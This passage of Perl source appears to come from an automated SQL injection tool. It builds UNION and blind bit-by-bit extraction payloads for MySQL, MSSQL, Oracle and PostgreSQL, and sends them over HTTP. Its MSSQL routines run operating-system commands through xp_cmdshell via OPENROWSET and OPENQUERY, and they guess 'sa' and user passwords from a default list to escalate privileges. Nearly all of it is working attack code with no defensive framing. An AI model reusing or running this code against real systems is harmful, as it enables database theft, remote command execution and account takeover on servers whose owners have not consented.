	    				if($item2[0] =~ /$INJECT_tmp/) {
						print_debug( "INJECT un_escaped is in the delta:\t\t". uri_unescape($INJECT),'DEBUG_L2',4);
						$tmp_found =1;
					}
				}

				
				# In case of PHP magic quote
				# Returns a string with backslashes before characters that need to be quoted in database queries etc.
				# These characters are single quote ('), double quote ("), backslash (\) and NUL (the NULL byte).
				
				if( !$tmp_found ) {
					$INJECT_tmp = uri_unescape($INJECT);
					$INJECT_tmp =~ s/\\/\\\\/g;
					$INJECT_tmp =~ s/'/\\'/g;
					$INJECT_tmp =~ s/"/\\"/g;
					$INJECT_tmp = quotemeta($INJECT_tmp);
	    				if($item2[0] =~ /$INJECT_tmp/) {
						print_debug( "INJECT magic quote is in the delta:\t\t". uri_unescape($INJECT),'DEBUG_L2',4);
						$tmp_found =1;
					}
				}
				
				if($tmp_found) {
					my $tmp = $item2[0];
					$tmp =~ s/$INJECT_tmp/INJECT_HERE/g;
					$tmp=quotemeta($tmp);
					$tmp =~ s/INJECT_HERE/(.+)/g;
					
					if($item1[0] =~ /$tmp/) {
						if($1 eq $params->{Y}) {
							print_debug( "Delta is the paramater: $1  <==> $INJECT",'DEBUG_L2',4);
						} else {
							$tmp_result = 0;
							last;
						}
					}	
					
				} else {
					$tmp_result = 0;
					last;
				}
			}
		}
		
		if($tmp_result) {$result=1}
	}
			
	return $result;
}


sub exploit_union () {
	my ($params, $method, $Key, $vector,$function) = @_;
	
	my $X = $params->{X};
	my $Y = $params->{Y};
	
	my @type = ();
	my @displayed = ();
	my @multiple = ();
	
	my $quote = "'";
	if($method%2) {
		$quote = "";
	}
	
	if($function eq "") {
		$function = $DATABASE{$Key}->{version};
	}
	
	print_debug("UNION attack started",'INFO',3);
	
	$params->{INJECT} = uri_escape("$Y$quote AND 1=1;--");
	if(tryout( $params )) {
		$params->{INJECT} = uri_escape("$Y$quote AND 1=0;--");
		if(!(tryout( $params ))) {
			my $select= "char(49)";
			$params->{INJECT} = uri_escape("$Y$quote union all select $select where 1=0;--");
			if(tryout( $params )) { 
				print_debug("UNION: found 1 column",'INFO',3);
			}
			 
			for(my $i=1;$i<10;$i++) {	
				$select = $select . ",char(". ($i+49) .")";
				$params->{INJECT} = uri_escape("$Y$quote union all select $select where 1=0;--");
				if(tryout( $params )) {
					print_debug("UNION: found ".($i+1)." columns",'INFO',3);
					# FIND Type for columns
					for(my $j=1;$j<=$i+1;$j++) {									
						my $tmp=$select;
						my $ascii = 48 + $j;
						$tmp =~ s/char\($ascii\)/$j/;
						$params->{INJECT} = uri_escape("$Y$quote union all select $tmp where 1=0;--");
						if(tryout( $params )) {
							print_debug("UNION: param $j is an integer",'INFO',4);
							$type[$j]="integer";
						} else { 
							print_debug("UNION: param $j is a string",'INFO',4);
							$type[$j]="string";
						}
					}
					# FIND if the variable is displayed or not
					for(my $j=1;$j<=$i+1;$j++) {									
						my $tmp=$select;
						my $ascii = 48 + $j;
						
						if($type[$j] eq "string") {
							$tmp =~ s/char\($ascii\)/convert(varchar,0x5441474759)/;
						} else {
							$tmp =~ s/char\($ascii\)/17932487-1/;
						}
						
						$params->{INJECT} = uri_escape("$Y$quote AND 1=0 union all select $tmp;--");
						my $res;
						
						my $URL = $params->{URL};
						$URL =~ s/--INJECT_HERE--/$params->{INJECT}/g;
						my $CONTENT = $params->{CONTENT};
						$CONTENT =~ s/--INJECT_HERE--/$params->{INJECT}/;
				
						print_debug("[Debug - tryout] URL ==> $URL",'DEBUG_L2',3);
						print_debug("[Debug - tryout] URL ==> $CONTENT",'DEBUG_L2',3);
				
						$res = fetch($URL, $params->{HTTP_METHOD}, $CONTENT);  
						
						if((rindex($res->content, "TAGGY")!= -1) || (rindex($res->content, "17932486")!= -1))  {
							print_debug("UNION: param $j is displayed",'INFO',4);
							$displayed[$j]=1;
						} else { 
							print_debug("UNION: param $j is not displayed",'INFO',4);
							$displayed[$j]=0;
						}
					}
					
					# FIND if multiple lines are displayed
					for(my $j=1;$j<=$i+1;$j++) {
						if($displayed[$j]==1) {									
							my $tmp=$select;
							my $tmp2=$select;
							my $ascii = 48 + $j;
							
							if($type[$j] eq "string") {
								$tmp =~ s/char\($ascii\)/convert(varchar,0x544147475931)/;
								$tmp2 =~ s/char\($ascii\)/convert(varchar,0x544147475932)/;
							} else {
								$tmp =~ s/char\($ascii\)/17932487-1/;
								$tmp2 =~ s/char\($ascii\)/17932487-2/;
							}
							
							$params->{INJECT} = uri_escape("$Y$quote AND 1=0 union all select $tmp union all select $tmp2;--");
							my $res;
							
							my $URL = $params->{URL};
							$URL =~ s/--INJECT_HERE--/$params->{INJECT}/g;
							my $CONTENT = $params->{CONTENT};
							$CONTENT =~ s/--INJECT_HERE--/$params->{INJECT}/;
					
							print_debug("[Debug - tryout] URL ==> $URL",'DEBUG_L2',3);
							print_debug("[Debug - tryout] URL ==> $CONTENT",'DEBUG_L2',3);
					
							$res = fetch($URL, $params->{HTTP_METHOD}, $CONTENT);  
							
							if( ((rindex($res->content, "TAGGY1")!= -1) && (rindex($res->content, "TAGGY2")!= -1))
								|| ((rindex($res->content, "17932486")!= -1) && (rindex($res->content, "17932485")!= -1)) )  {
								print_debug("UNION: param $j is multiple",'INFO',4);
								$multiple[$j]=1;
							}
						}
					}
					
					# URL Prototype
					my $tmp= "$Y$quote AND 1=0 union all select $select;--";
					for(my $j=1;$j<=$i+1;$j++) {
						my $ascii = 48 + $j;
						if($type[$j] eq "string") {
							$tmp =~ s/char\($ascii\)/--C$j--/;
						} else {
							$tmp =~ s/char\($ascii\)/--$j--/;
						}
					}	
					print_debug("Prototype: [$tmp]",'INFO',4);
					
					$tmp=uri_escape($tmp);
					my $URL = $params->{URL};
					$URL =~ s/--INJECT_HERE--/$tmp/g;
					
					print_debug("Prototype URL: $URL",'INFO',4);
					if($params->{CONTENT} ne "") {
						my $CONTENT = $params->{CONTENT};
						$CONTENT =~ s/--INJECT_HERE--/$tmp/;
						print_debug("Prototype CONTENT: $CONTENT",'INFO',4);
					}
					
					for(my $j=1;$j<=$i+1;$j++) {									
						if($type[$j] eq "string") {
							my $tmp=$select;
							my $ascii = 48 + $j;
							$tmp =~ s/char\($ascii\)/convert(varchar,0x544147475931)+$function+convert(varchar,0x544147475932)/;
							
							$params->{INJECT} = uri_escape("$Y$quote AND 1=0 union all select $tmp;--");
							my $res;
							
							my $URL = $params->{URL};
							$URL =~ s/--INJECT_HERE--/$params->{INJECT}/g;
							my $CONTENT = $params->{CONTENT};
							$CONTENT =~ s/--INJECT_HERE--/$params->{INJECT}/;
					
							print_debug("[Debug - tryout] URL ==> $URL",'DEBUG_L2',4);
							print_debug("[Debug - tryout] URL ==> $CONTENT",'DEBUG_L2',4);
					
							$res = fetch($URL, $params->{HTTP_METHOD}, $CONTENT);  
							
							if ($res->content =~ /TAGGY1(.*)TAGGY2/s) { 
								print_debug("function: $1",'FOUND',3);
							}
								
							last;
						}
					}
					last;
				}
			}	
		}
	}
}

sub exploit (%params, $method, $Key, $vector,$PATTERN,$PATTERN_FALSE,$function,$verbose,$b_dico) {
	my ($params, $method, $Key, $vector,$PATTERN,$PATTERN_FALSE,$function,$verbose,$b_dico) = @_;
	
	my $X = $params->{X};
	my $Y = $params->{Y};
	
	if($function eq "") {
		$params->{FUNCTION} = $DATABASE{$Key}->{version};
	} else {
		$params->{FUNCTION} = $function;
	}
	
	print_debug("Current function: $params->{FUNCTION}",'INFO',3) if $verbose==2;
	
	## --------------------------------------------------------------------------------------------
	## LENGTH
	## --------------------------------------------------------------------------------------------
	
	$params->{INJECT} = uri_escape(sprintf($PATTERN,$DATABASE{$Key}->{v_INJECT_LENGTH}));
	
	my $length="";
	my $function_value="";
	my $function_display_value="";
	my $result = -1;
	my $tmp;
	
	for (my $i=1; $i<=8;$i++) {
		$params->{POS_BIN} = 8-$i;
		$result = tryout( $params );
		$length=$length."$result";
		}

	my $length_dec = ord(pack('B8', $length));
	print_debug ("length: $length_dec",'INFO',3) if $verbose==2;
	
	if( ($length_dec ==0) || ($length_dec==255) ) {
		print_debug("\n",'INTERACTIVE',4) if $verbose>=1;
		return "";
	}
	
	## --------------------------------------------------------------------------------------------
	## VALUE
	## --------------------------------------------------------------------------------------------
				
	print_debug("value: ",'DEBUG',3);
	
	## --------------------------------------------------------------------------------------------
	# Dictionary based
	
	$function_value = "_"x$length_dec;
	tie my @function_array, 'Tie::CharArray', $function_value;
	my @function_char_found = ();
	
	$params->{OFFSET} = 1;
	my $BACKUP_FUNCTION = $params->{FUNCTION};	
	
	if($b_dico) {
		$params->{FUNCTION} = $DATABASE{$Key}->{test_function};
		$params->{WORD} = $DATABASE{$Key}->{test_pattern};
		
		$params->{INJECT} = uri_escape(sprintf($PATTERN,$DATABASE{$Key}->{v_INJECT_WORD}));
			
		if(tryout( $params)) { # We test the global behavior with something we know to be true to not produce false positive
			foreach my $word (@{$DATABASE{$Key}->{DICO}}) {
				my $previous_ref = 0;
				my $loop=1;
				
				$params->{OFFSET} = 1;
				$params->{INJECT} = uri_escape(sprintf($PATTERN_FALSE,$DATABASE{$Key}->{v_INJECT_WORD}));
				
				if($Key eq 'Oracle' || $Key eq 'PostgreSQL') {
					if($method%2) {
						(my $word_hex = $word) =~ s/(.|\n)/sprintf("chr(%d)||", ord $1)/eg; #generate a long URL but no quote
						$params->{WORD} = substr($word_hex,0,length($word_hex)-2);
					} else {
						$params->{WORD} = "'$word'"; #quotes but short
					}
				} else {
					(my $word_hex = $word) =~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;	
					#if($Key eq 'PostgreSQL') {
					#	$word_hex =~ s/([a-z])/sprintf("||chr(%d)||", ord $1)/eg;
					#	if(substr($word_hex,length($word_hex)-2,2) eq "||") {$word_hex = substr($word_hex,0,length($word_hex)-2);}
					#}	
					$params->{WORD} = $word_hex;
				}
				
				$params->{FUNCTION} = $BACKUP_FUNCTION;
				
				while(!(tryout( $params ))) {
					$params->{INJECT} = uri_escape(sprintf($PATTERN,$DATABASE{$Key}->{v_INJECT_WORD_POS}));
					
					my $position = "";
					for (my $i=1; $i<=8;$i++) {
						$params->{POS_BIN} = 8-$i;
						$result = tryout( $params );
						$position=$position."$result";
					}
					
					my $position_dec = ord(pack('B8', $position));
					if($position == 0) {last;}
					$position_dec = $position_dec+$previous_ref-1;	# position is perl based (start at 0)	
					
					for(my $k=0;$k<length($word);$k++) {
						$function_array[$position_dec+$k]=substr($word,$k,1);
						$function_char_found[$position_dec+$k]=1;
					}
					$function_display_value=$function_value;
					print_debug("$function_display_value",'INTERACTIVE',4) if $verbose>=1;
					
					if($Key eq 'MSSQL') {
						#$previous_ref = $previous_ref+$position_dec+length($word);
						$previous_ref = $position_dec+1+length($word);
						$params->{FUNCTION} = $BACKUP_FUNCTION;
						$params->{FUNCTION} = uri_escape("substring(".$params->{FUNCTION}.",".($previous_ref+1).",".($length_dec-$previous_ref).")");
					} 
					if($Key eq 'PostgreSQL') {
						#$previous_ref = $previous_ref+$position_dec+length($word);
						$previous_ref = $position_dec+1+length($word);
						$params->{FUNCTION} = $BACKUP_FUNCTION;
						$params->{FUNCTION} = uri_escape("substring(".$params->{FUNCTION}." from ".($previous_ref+1)." for ".($length_dec-$previous_ref).")");
					} 
					if($Key eq 'Oracle') {
						$params->{OFFSET}++;
					}
					if($Key eq 'MySQL') {
						$params->{OFFSET}=$position_dec+length($word);
					}
					
					$params->{INJECT} = uri_escape(sprintf($PATTERN_FALSE,$DATABASE{$Key}->{v_INJECT_WORD}));
				}
			}
		}
	}
	
	## --------------------------------------------------------------------------------------------
	## Character based 
	
	$params->{FUNCTION} = $BACKUP_FUNCTION;
	
	$params->{INJECT} = uri_escape(sprintf($PATTERN,$DATABASE{$Key}->{v_INJECT_CHAR}));

	my $newline =0;
						
	for (my $j=1; $j<=$length_dec; $j++) {
		if($function_char_found[$j-1]!=1) {
			$tmp="";
			$params->{POS_CHAR} = $j;
			for (my $i=1; $i<=8;$i++) {
				$params->{POS_BIN} = 8-$i;
				$result = tryout( $params );
				$tmp=$tmp."$result";
			}
			my $decimal = ord(pack('B8', $tmp));
			$function_array[$j-1]=chr($decimal);
			if($decimal==10) {
				print_debug(substr($function_value,$newline,$j-1-$newline)." "x($length_dec-$j+1)."\n",'INTERACTIVE',4) if $verbose>=1;
				$newline=$j;
			} else {
				$function_display_value=substr($function_value,$newline,$length_dec-$newline);
				print_debug("$function_display_value",'INTERACTIVE',4) if $verbose>=1;
			}
		}
	}
	print_debug("\n",'INTERACTIVE',4) if $verbose>=1;
	
	return $function_value;
}


##-------------------------------------------------------------------------------------------------
# MS-SQL Advanced command injection functions
#
##-------------------------------------------------------------------------------------------------

sub blind_MSSQL_execute_cmd (%params, $method, $Key, $vector,$PATTERN,$PATTERN_FALSE,$cmd,$option_login,$option_password) {
	my ($params, $method, $Key, $vector,$PATTERN,$PATTERN_FALSE,$cmd,$option_login,$option_password) = @_;
	
	# If we have a linked server and sa
	# select * from OPENQUERY([HR-INTRANET],'select 1;exec xp_cmdshell ''osql -E -Q "CREATE TABLE TMP_TMP (id int identity(1,1),cmd varchar(8000))"'';')
	# select * from OPENQUERY([HR-INTRANET],'select 1;insert TMP_TMP exec xp_cmdshell ''dir c:\'';')
	# select count(*) from TMP_TMP
	# select 1 where 1=(select cmd from TMP_TMP where id=7)
	# select * from OPENQUERY([HR-INTRANET],'select 1;exec xp_cmdshell ''osql -E -Q "DROP TABLE TMP_TMP"'';')
	
	# If already sa
	# select * from OPENROWSET('MSDASQL','DRIVER={SQL Server};SERVER=;','select @@version')
	# select * from OPENROWSET('SQLOLEDB','';;,'select @@version') 
	
	#select * from OPENROWSET('MSDASQL','DRIVER={SQL Server};SERVER=;','select 1;exec xp_cmdshell ''osql -E -Q "CREATE TABLE TMP_TMP (id int identity(1,1),cmd varchar(8000))"'';')
	#select * from OPENROWSET('MSDASQL','DRIVER={SQL Server};SERVER=;','select 1;insert TMP_TMP exec xp_cmdshell ''dir c:\''')
	#select * from master..TMP_TMP
	#select * from OPENROWSET('MSDASQL','DRIVER={SQL Server};SERVER=;','select 1;exec xp_cmdshell ''osql -E -Q "DROP TABLE TMP_TMP"'';')
	
	my $res;
	my $result = 0;
	my $b_sysadmin=0;
	
	my $credentials ="'MSDASQL','DRIVER={SQL Server};SERVER=;'";
	
	print_debug("System command injector:",'INFO',3);
	
	my $DB = exploit(\%{$params}, $method, $Key, $vector,$PATTERN,$PATTERN_FALSE,"db_name()",0); 
	print_debug("Current database: $DB",'INFO',3);
	
	if($option_login) {
		print_debug("Using login/password from command line [$option_login / $option_password]",'INFO',3);
		$credentials = "'SQLOLEDB','';'$option_login';'$option_password'";
		$b_sysadmin=1; # assumed based on user input
	} else {
		$params->{INJECT} = uri_escape(sprintf($PATTERN,"IS_SRVROLEMEMBER(convert(varchar,0x73797361646D696E))"));
		if(tryout( $params )) {
			# We have sysadmin right
			$b_sysadmin=1;
			print_debug("Running with sysadmin role",'INFO',3);
		} else {
			print_debug("We are not sysadmin for now",'INFO',3);
			
			my ($tmp_result,$sudo,$login,$password) = blind_MSSQL_OPENROWSET($params,$method, $Key, $vector, $PATTERN, $PATTERN_FALSE);
			if($tmp_result) {
				if($sudo) {
					$credentials = "'SQLOLEDB','';'$login';'$password'";
					$b_sysadmin=1;
				}
			}
		}	
	}
	
	if($b_sysadmin) {	
		print_debug("\n",'INTERACTIVE',4);
		print_debug("===========================================================================\n\n",'INTERACTIVE',4);
		
		$params->{INJECT} = uri_escape(sprintf($PATTERN,"(select 1 from OPENROWSET($credentials,'select 1;exec xp_cmdshell ''osql -E -Q \"CREATE TABLE $DB..TMP_TMP (id int identity(1,1),cmd varchar(8000))\"'';'))"));
		if(tryout( $params )) {
			$params->{INJECT} = uri_escape(sprintf($PATTERN,"(select 1 from OPENROWSET($credentials,'select 1;insert $DB..TMP_TMP exec xp_cmdshell ''$cmd'''))"));
			if(tryout( $params )) {
				my $nb_lines = int(exploit(\%{$params}, $method, $Key, $vector,$PATTERN,$PATTERN_FALSE,uri_escape("(select convert(varchar,count(*)) from $DB..TMP_TMP)"),0));
				
				for(my $i=1;$i<=$nb_lines;$i++) {
					#print_debug(exploit(\%{$params}, $method, $Key, $vector,$PATTERN,$PATTERN_FALSE,"(select cmd from $DB..TMP_TMP where id=$i)",0)."\n",'INTERACTIVE',4);
					exploit(\%{$params}, $method, $Key, $vector,$PATTERN,$PATTERN_FALSE,uri_escape("(select cmd from $DB..TMP_TMP where id=$i)"),1);
				}
		
				print_debug("\n",'INTERACTIVE',4);
				print_debug("===========================================================================\n\n",'INTERACTIVE',4);
			}
			
			$params->{INJECT} = uri_escape(sprintf($PATTERN,"(select 1 from OPENROWSET($credentials,'select 1;exec xp_cmdshell ''osql -E -Q \"DROP TABLE $DB..TMP_TMP\"'';'))"));
			tryout( $params )
		}
	}
}

sub blind_MSSQL_OPENQUERY (%params, $method, $Key, $vector,$PATTERN,$PATTERN_FALSE) {
	my ($params, $method, $Key, $vector,$PATTERN,$PATTERN_FALSE) = @_;
	
	my $result = 0;
	
	print_debug("Checking OpenQuery availibility - please wait...",'INFO',3);
	
	# get @@servername
	my $servername = exploit(\%{$params}, $method, $Key, $vector,$PATTERN,$PATTERN_FALSE,"\@\@servername",0); 
	# get host_name()
	my $hostname =  exploit(\%{$params}, $method, $Key, $vector,$PATTERN,$PATTERN_FALSE,"host_name()",0); 
	
	print_debug("host_name() = [$hostname]  - \@\@servername = [$servername]",'INFO',4);
	
	if(!$result) {
		$params->{INJECT} = uri_escape(sprintf($PATTERN,"(select 1 from OPENQUERY([$servername],'select 1'))"));
		if(tryout( $params )) {
			print_debug("OPENQUERY available - linked server [$servername]",'FOUND',4);
			$result = 1;
		} 
	}	
	
	if(!$result) {
		$params->{INJECT} = uri_escape(sprintf($PATTERN,"(select 1 from OPENQUERY([$hostname],'select 1'))"));
		if(tryout( $params )) {
			print_debug("OPENQUERY available - linked server [$hostname]",'FOUND',4);
			$result = 1;
		} 
	}
	
	# if agressive mode and no result
	#sp_addlinkedserver @server = 'LOCALSERVER',  @srvproduct = '',@provider = 'SQLOLEDB', @datasrc = @@servername
	# MSDASQL
	# 'SET FMTONLY OFF' see http://www.sommarskog.se/share_data.html
	
	return $result;
	
}

sub blind_MSSQL_OPENROWSET (%params, $method, $Key, $vector,$PATTERN,$PATTERN_FALSE) {
	my ($params, $method, $Key, $vector,$PATTERN,$PATTERN_FALSE) = @_;
	
	my $result = 0;
	my $login ="";
	my $password = "";
	my $sudo =0;
	
	my @passwords = ('','sa','pass','password');
	
	print_debug("Checking OpenRowSet availibility - please wait...",'INFO',3);
	
	# get system_user
	my $user = exploit(\%{$params}, $method, $Key, $vector,$PATTERN,$PATTERN_FALSE,"system_user",0); 
	print_debug("Current user login: [$user]",'INFO',4);
	
	foreach my $pass (@passwords) {
		$params->{INJECT} = uri_escape(sprintf($PATTERN,"(select 1 from OPENROWSET('SQLOLEDB','';'sa';'$pass','select 1'))"));
		if(tryout( $params )) {
			print_debug("OPENROWSET available - (login [sa] | password [$pass])",'FOUND',4);
			if($user ne "sa") {print_debug("Privilege escalation - from [$user] to [sa]",'INFO',4);}
			$login = "sa"; $password=$pass;$sudo=1;
			$result = 1;
			last;
		}
	}
	
	if(!$result && ($user ne "sa")) {
		push(@passwords,$user);
		foreach my $pass (@passwords) {
			$params->{INJECT} = uri_escape(sprintf($PATTERN,"(select 1 from OPENROWSET('SQLOLEDB','';'$user';'$pass','select 1'))"));
			if(tryout( $params )) {
				print_debug("OPENROWSET available - (login [$user] | password [$pass])",'FOUND',4);
				$params->{INJECT} = uri_escape(sprintf($PATTERN,"IS_SRVROLEMEMBER(convert(varchar,0x73797361646D696E))"));
				if(tryout( $params )) {
					print_debug("Login [$user] has 'sysadmin' role",'INFO',4);
				}
				$login = $user; $password=$pass;
				$result = 1;
				last;
			}
		}
	}
	
	return ($result,$sudo,$login,$password);
}

return 1;
